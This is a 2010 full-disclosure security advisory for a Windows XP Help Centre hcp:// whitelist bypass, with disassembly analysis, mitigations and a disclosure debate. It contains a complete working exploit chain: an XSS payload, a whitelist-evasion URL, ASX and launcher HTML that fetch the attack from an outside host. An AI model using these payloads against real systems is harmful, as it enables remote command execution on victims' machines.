@@ -1,0 +1,449 @@
+Microsoft Windows Help Centre Handles Malformed Escape Sequences Incorrectly
+----------------------------------------------------------------------------
+
+Help and Support Centre is the default application provided to access online
+documentation for Microsoft Windows. Microsoft supports accessing help documents
+directly via URLs by installing a protocol handler for the scheme "hcp", 
+a typical example is provided in the Windows XP Command Line Reference,
+available at http://technet.microsoft.com/en-us/library/bb490918.aspx.
+
+Using hcp:// URLs is intended to be safe, as when invoked via the registered
+protocol handler the command line parameter /fromhcp is passed to the help
+centre application. This flag switches the help centre into a restricted mode,
+which will only permit a whitelisted set of help documents and parameters.
+
+This design, introduced in SP2, is reasonably sound. A whitelist of trusted
+documents is a safe way of allowing interaction with the documentation from
+less-trusted sources. Unfortunately, an implementation error in the whitelist
+allows it to be evaded.
+
+URLs are normalised and unescaped prior to validation using
+MPC::HTML::UrlUnescapeW(), which in turn uses MPC::HexToNum() to translate URL
+escape sequences into their original characters, the relevant code from
+helpctr.exe 5.1.2600.5512 (latest at time of writing) is below.
+
+.text:0106684C Unescape:
+.text:0106684C        cmp     di, '%'              ; di contains the current wchar in the input URL.
+.text:01066850        jnz     short LiteralChar    ; if this is not a '%', it must be a literal character.
+.text:01066852        push    esi                  ; esi contains a pointer to the current position in URL to unescape.
+.text:01066853        call    ds:wcslen            ; find the remaining length.
+.text:01066859        cmp     word ptr [esi], 'u'  ; if the next wchar is 'u', this is a unicode escape and I need 4 xdigits.
+.text:0106685D        pop     ecx                  ; this sequence calculates the number of wchars needed (4 or 2).
+.text:0106685E        setz    cl                   ; i.e. %uXXXX (four needed), or %XX (two needed).
+.text:01066861        mov     dl, cl
+.text:01066863        neg     dl
+.text:01066865        sbb     edx, edx
+.text:01066867        and     edx, 3
+.text:0106686A        inc     edx
+.text:0106686B        inc     edx
+.text:0106686C        cmp     eax, edx             ; test if I have enough characters in input to decode.
+.text:0106686E        jl      short LiteralChar    ; if not enough, this '%' is considered literal.
+.text:01066870        test    cl, cl
+.text:01066872        movzx   eax, word ptr [esi+2]
+.text:01066876        push    eax
+.text:01066877        jz      short NotUnicode
+.text:01066879        call    HexToNum             ; call MPC::HexToNum() to convert this nibble (4 bits) to an integer.
+.text:0106687E        mov     edi, eax             ; edi contains the running total of the value of this escape sequence.
+.text:01066880        movzx   eax, word ptr [esi+4]
+.text:01066884        push    eax
+.text:01066885        shl     edi, 4               ; shift edi left 4 positions to make room for the next digit, i.e. total <<= 4;
+.text:01066888        call    HexToNum             
+.text:0106688D        or      edi, eax             ; or the next value into the 4-bit gap, i.e. total |= val.
+.text:0106688F        movzx   eax, word ptr [esi+6]; this process continues for the remaining wchars.
+.text:01066893        push    eax
+.text:01066894        shl     edi, 4
+.text:01066897        call    HexToNum
+.text:0106689C        or      edi, eax
+.text:0106689E        movzx   eax, word ptr [esi+8]
+.text:010668A2        push    eax
+.text:010668A3        shl     edi, 4
+.text:010668A6        call    HexToNum
+.text:010668AB        or      edi, eax
+.text:010668AD        add     esi, 0Ah              ; account for number of bytes (not chars) consumed by the escape.
+.text:010668B0        jmp     short FinishedEscape
+.text:010668B2
+.text:010668B2 NotUnicode:                             
+.text:010668B2        call    HexToNum             ; this is the same code, but for non-unicode sequences (e.g. %41, instead of %u0041)
+.text:010668B7        mov     edi, eax
+.text:010668B9        movzx   eax, word ptr [esi]
+.text:010668BC        push    eax
+.text:010668BD        call    HexToNum
+.text:010668C2        shl     eax, 4
+.text:010668C5        or      edi, eax
+.text:010668C7        add     esi, 4               ; account for number of bytes (not chars) consumed by the escape.
+.text:010668CA
+.text:010668CA FinishedEscape:
+.text:010668CA        test    di, di
+.text:010668CD        jz      short loc_10668DA
+.text:010668CF
+.text:010668CF LiteralChar:
+.text:010668CF        push    edi                  ; append the final value to the normalised string using a std::string append.
+.text:010668D0        mov     ecx, [ebp+unescaped]
+.text:010668D3        push    1
+.text:010668D5        call    std::string::append
+.text:010668DA        mov     di, [esi]            ; fetch the next input character.
+.text:010668DD        test    di, di               ; have we reached the NUL terminator?
+.text:010668E0        jnz     Unescape             ; process next char.
+
+This code seems sane, but an error exists due to how MPC::HexToNum() handles
+error conditions, the relevant section of code is annotated below.
+
+.text:0102D32A        mov     edi, edi
+.text:0102D32C        push    ebp
+.text:0102D32D        mov     ebp, esp              ; function prologue.
+.text:0102D32F        mov     eax, [ebp+arg_0]      ; fetch the character to convert.
+.text:0102D332        cmp     eax, '0'
+.text:0102D335        jl      short CheckUppercase  ; is it a digit?
+.text:0102D337        cmp     eax, '9'
+.text:0102D33A        jg      short CheckUppercase
+.text:0102D33C        add     eax, 0FFFFFFD0h       ; atoi(), probably written val - '0' and optimised by compiler.
+.text:0102D33F        jmp     short Complete   
+.text:0102D341 CheckUppercase:
+.text:0102D341        cmp     eax, 'A'
+.text:0102D344        jl      short CheckLowercase  ; is it an uppercase xdigit?
+.text:0102D346        cmp     eax, 'F'
+.text:0102D349        jg      short CheckLowercase
+.text:0102D34B        add     eax, 0FFFFFFC9h       ; atoi()
+.text:0102D34E        jmp     short Complete   
+.text:0102D350 CheckLowercase:
+.text:0102D350        cmp     eax, 'a'
+.text:0102D353        jl      short Invalid         ; lowercase xdigit?
+.text:0102D355        cmp     eax, 'f'
+.text:0102D358        jg      short Invalid    
+.text:0102D35A        add     eax, 0FFFFFFA9h       ; atoi()
+.text:0102D35D        jmp     short Complete    
+.text:0102D35F Invalid:     
+.text:0102D35F        or      eax, 0FFFFFFFFh       ; invalid character, return -1
+.text:0102D362 Complete:   
+.text:0102D362        pop     ebp
+.text:0102D363        retn    4
+
+Thus, MPC::HTML::UrlUnescapeW() does not check the return code of
+MPC::HexToNum() as required, and therefore can be manipulated into appending
+unexpected garbage onto std::strings. This error may appear benign, but we can
+use the miscalculations produced later in the code to evade the /fromhcp
+whitelist.
+
+Assuming that we can access arbitrary help documents (full details of how the
+MPC:: error can be used to accomplish this will be explained below), we must
+identify a document that can be controlled purely from the URL used to access it.
+
+After browsing the documents available in a typical installation, the author
+concluded the only way to do this would be a cross site scripting error. After
+some careful searching, a candidate was discovered:
+
+hcp://system/sysinfo/sysinfomain.htm?svr=<h1>test</h1>
+
+This document is available in a default installation, and due to insufficient
+escaping in GetServerName() from sysinfo/commonFunc.js, the page is vulnerable
+to a DOM-type XSS. However, the escaping routine will abort encoding if characters
+such as '=' or '"' or others are specified. 
+
+It's not immediately obvious that this error is still exploitable, simple
+tricks like <img src=bad onerror=code> don't apply, and <script>code</script>
+isn't helpful as the code isn't evaluated again. In situations like this, the
+best course of action is to harass lcamtuf until he gives you the solution,
+which of course his encyclopaedic knowledge of browser security quirks produced
+immediately.
+
+<script defer>code</script>
+
+The defer property is an IE-ism which solves the problem, documented by
+Microsoft here http://msdn.microsoft.com/en-us/library/ms533719%28VS.85%29.aspx.
+Now that we are armed with knowledge of this trick, because these help
+documents are in a privileged zone, we can simply execute commands.
+
+You can test this with a command like so (assuming a recent IE):
+
+C:\> ver
+Microsoft Windows XP [Version 5.1.2600]
+C:\> c:\windows\pchealth\helpctr\binaries\helpctr.exe -url "hcp://system/sysinfo/sysinfomain.htm?svr=<script defer>eval(unescape('Run%28%22calc.exe%22%29'))</script>"
+C:\>
+
+While this is fun, this isn't a vulnerability unless an untrusted third party
+can force you to access it. Testing suggests that by default, accessing an
+hcp:// URL from within Internet Explorer >= 8, Firefox, Chrome (and presumably
+other browsers) will result in a prompt. Although most users will click through
+this prompt (perfectly reasonable, protocol handlers are intended to be safe),
+it's not a particularly exciting attack.
+
+I've found a way to avoid the prompt in a default Windows XP installation in all
+major browsers, The solution is to invoke the protocol handler from within an
+<iframe> in an ASX HtmlView element. There are probably other ways.
+
+http://en.wikipedia.org/wiki/Advanced_Stream_Redirector
+
+The version of Windows Media Player that is available by default in Windows XP
+is WMP9, which installs an NPAPI and ActiveX plugin to render windows media
+content. Later versions also can be used, with some minor complications.
+
+Thus, the attack will look like this:
+
+$ cat simple.asx 
+<ASX VERSION="3.0">
+<PARAM name="HTMLView" value="http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/starthelp.html"/>
+<ENTRY>
+   <REF href="http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/bug-vs-feature.jpg"/>
+</ENTRY>
+</ASX>
+
+Where starthelp.html contains something like:
+
+$ cat starthelp.html 
+<iframe src="hcp://...">
+
+Forcing a user to read an .ASX file can be achieved in a cross-browser manner like so:
+
+$ cat launchurl.html 
+<html>
+<head><title>Testing HCP</title></head>
+<body>
+  <h1>OK</h1>
+  <script>
+        // HCP:// Vulnerability, Tavis Ormandy, June 2010.
+        var asx = "http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/simple.asx";
+
+        if (window.navigator.appName == "Microsoft Internet Explorer") {
+            // Internet Explorer
+            var o = document.createElement("OBJECT");
+            o.setAttribute("classid", "clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6");
+            o.openPlayer(asx);
+        } else {
+            // Mozilla, Chrome, Etc.
+            var o = document.createElement("IFRAME");
+            o.setAttribute("src", asx);
+            document.body.appendChild(o);
+        }
+  </script>
+</body>
+</html>
+
+Therefore, we have the following interactions between multiple complex systems
+chained together:
+
+- From an html page, email, document, or other application force a user to
+  fetch a .ASX file containing an HtmlView element.
+- From the HtmlView element, invoke the hcp protocol handler that would normally
+  require confirmation.
+- From the HCP Protocol handler, bypass the /fromhcp whitelist by using the
+  string miscalculations caused by failing to check the return code of
+  MPC::HexToNum().
+- Once the whitelist has been defeated, invoke the Help document with a known
+  DOM XSS due to GetServerName() insufficient escaping.
+- Use the defer property of a script tag to execute script in a privileged zone
+  even after the page has been rendered.
+- Invoke an arbitrary command using the wscript.shell object.
+
+Figuring out how to use the MCP::HexToNum() error to defeat the /fromhcp
+whitelist took some analysis, but the result looks like the following.
+
+hcp://services/search?query=anything&topic=hcp://system/sysinfo/sysinfomain.htm%
+A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%
+%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A
+%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%
+A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=%3
+Cscript%20defer%3Eeval%28unescape%28%27Run%2528%2522calc.exe%2522%2529%27%29%29%
+3C/script%3E
+
+--------------------
+Affected Software
+------------------------
+
+At least Microsoft Windows XP, and Windows Server 2003 are affected. The attack
+is enhanced against IE >= 8 and other major browsers if Windows Media Player is
+available, but an installation is still vulnerable without it.
+
+Machines running version of IE less than 8 are, as usual, in even more trouble.
+
+In general, choice of browser, mail client or whatever is not relevant, they
+are all equally vulnerable.
+
+--------------------
+Consequences
+-----------------------
+
+Upon successful exploitation, a remote attacker is able to execute arbitrary
+commands with the privileges of the current user.
+
+I've prepared a demonstration for a typical Windows XP installation with
+Internet Explorer 8, and the default Windows Media Player 9.
+
+http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/launchurl.html
+
+In IE7 on Windows XP, just visiting this URL should be sufficient:
+
+http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/starthelp.html
+
+Some minor modifications will be required to target other configurations, this
+is simply an attempt to demonstrate the problem. I'm sure the smart guys at
+metasploit will work on designing reliable attacks, as security professionals
+require these to do their jobs.
+
+Additionally, my demonstration is not intended to be stealthy, a real
+attack would barely be noticable to the victim. Perhaps the only unavoidable
+signal would be the momentary appearance of the Help Centre window before the
+attacker hides it. There are multiple trivial techniques that can be used to
+accomplish this.
+
+Browsers are useful to demonstrate the problem, but there are certainly other
+attack vectors, such as MUAs, documents, etc. Protocol handlers are designed to
+be used across applications.
+
+-------------------
+Mitigation
+-----------------------
+
+If you believe you may be affected, you should consider applying one of the
+workarounds described below.
+
+Few users rely on Help Centre urls, it is safe to temporarily disable them
+by removing HKCR\HCP\shell\open. This modification can be deployed easily using
+GPOs. For more information on Group Policy, see Microsoft's Group Policy site,
+here
+
+http://technet.microsoft.com/en-us/windowsserver/bb310732.aspx
+
+A few caveats, 
+
+    * I am aware that some support technicians rely on the Remote Assistance
+      tool provided by the Help Center application using shortcuts like
+      "explorer.exe hcp://CN=Microsoft%20Corporation,L=Re...". You can continue
+      to use this technique by substituting "explorer.exe hcp://..." for
+      "helpctr.exe /url hcp://...", without relying on the protocol handler.
+
+    * One or two links in explorer, such as selecting "Help" from the Control
+      Panel category view, may no longer function. If this concerns you, it is
+      possible to gracefully degrade by replacing the protocol handler with a
+      command to open a static intranet support page, e.g.
+      "chrome.exe http://techsupport.intranet".
+
+    * As always, if you do not use this feature, consider permanently disabling
+      it in order to reduce attack surface. Historically, disabling unused
+      protocol handlers has always proven to be a wise investment in security. 
+
+In the unlikely event that you heavily rely on the use of hcp://, I have
+created an unofficial (temporary) hotfix. You may use it under the terms of
+the GNU General Public License, version 2 or later. Of course, you should only
+use it as a last resort, carefully test the patch and make sure you understand
+what it does (full source code is included). It may be necessary to modify it
+to fit your needs.
+
+The package is availble for x86 here:
+
+http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/hcphotfix.zip
+
+[ NOTE: Please avoid linking to this file out of context, it is intended for
+        consideration as a potential mitigation by experienced administrators,
+        and is not suitable for consumption by end-users ]
+
+The hotfix intercepts helpctr.exe invokations, and patches MPC::HexToNum() to
+return zero on error, rather than -1. Nothing is changed on disk, and it can be
+safely removed at anytime. Of course, the result of an invalid unescape is still
+incorrect, but this specific vulnerability should be rendered inert. I would be
+greatful if the community could contribute bugfixes, testing, an x64 port, and
+so on. Once information is in the open, we can all collaborate on our
+collective security.
+
+Some clarifications,
+
+    * Fixing the XSS is not a solution, the root cause is the whitelist
+      evasion, any mitigation that does not address this is simply papering
+      over the issue. An army of researchers that specialise in XSS exists, and
+      i'm sure they will turn their attention to help documents once they
+      realise their value. Assume more will be discovered.
+
+    * That said, if you are an XSS expert, examples in whitelisted pages
+      (/services/index, /services/search, etc.) would be useful, your skills
+      could be helpful making this important software safe.
+
+    * Removing Windows Media player is not a solution, it simply makes a fun
+      demo for IE8 and other modern browsers.
+
+Finally, you should take this opportunity to disable all browser plugins and
+SFS ActiveX controls that are not regularly used. End users can do this
+themselves in Google Chrome by viewing about:plugins and disabling the plugins
+that are not required. In Mozilla Firefox, use the Tools->Add-ons->Plugins
+interface.
+
+-------------------
+Solution
+-----------------------
+
+Microsoft was informed about this vulnerability on 5-Jun-2010, and they
+confirmed receipt of my report on the same day.
+
+Protocol handlers are a popular source of vulnerabilities, and hcp:// itself
+has been the target of attacks multiple times in the past. I've concluded that
+there's a significant possibility that attackers have studied this component,
+and releasing this information rapidly is in the best interest of security.
+
+Those of you with large support contracts are encouraged to tell your support
+representatives that you would like to see Microsoft invest in developing
+processes for faster responses to external security reports.
+
+-------------------
+Credit
+-----------------------
+
+This bug was discovered by Tavis Ormandy.
+
+-------------------
+Greetz
+-----------------------
+
+Greetz to Neel, Mark, Redpig, Spoonm, Skylined, asiraP, LiquidK, ScaryBeasts,
+Hawkes, Jagger, and all my other pimp colleagues.
+
+Special thanks to lcamtuf for his assistance with the deferred execution
+problem. You should read his Browser Security Handbook if you need to
+understand how web browser security /really/ works.
+
+http://code.google.com/p/browsersec/wiki/Main
+
+A colleague is organising a conference in Lucerne, Switzerland. He would really
+appreciate interesting papers from security people who want to talk about
+their research (travel, hotel, etc. covered).
+
+https://www.hashdays.ch/
+
+-------------------
+Notes
+-----------------------
+
+I would like to point out that if I had reported the MPC::HexToNum() issue
+without a working exploit, I would have been ignored.
+
+Without access to extremely smart colleagues, I would likely have given up,
+leaving you vulnerable to attack from those who just want root on your network
+and do not care about disclosure policies.
+
+This is another example of the problems with bug secrecy (or in PR speak,
+"responsible disclosure"), those of us who work hard to keep networks safe are
+forced to work in isolation without the open collaboration with our peers that
+we need, especially in complex cases like this, where creative thinking and
+input from experts in multiple disciplines is required to join the dots.
+
+A good place to start researching full disclosure would be this accessible
+and insightful essay by Bruce Schneier.
+
+http://www.schneier.com/essay-146.html
+
+His balanced coverage of the debate is also available in this essay.
+
+http://www.schneier.com/crypto-gram-0111.html#1
+
+Finally, a reminder that this document represents my own work and opinions, I
+do not speak for or represent anyone but myself.
+
+-------------------
+References
+-----------------------
+
+hcp:// has been broken a few times over the years, for example:
+
+- http://seclists.org/bugtraq/2002/Aug/225, Delete arbitrary files using Help and Support Center
+- http://www.microsoft.com/technet/security/bulletin/ms03-044.mspx, HCP memory corruption by Dave Litchfield.
+
+The current design is actually pretty sound, I'm sure Microsoft are
+dissapointed they missed this flaw. In their defense, I think there's a good
+chance I would have also missed this in code review.
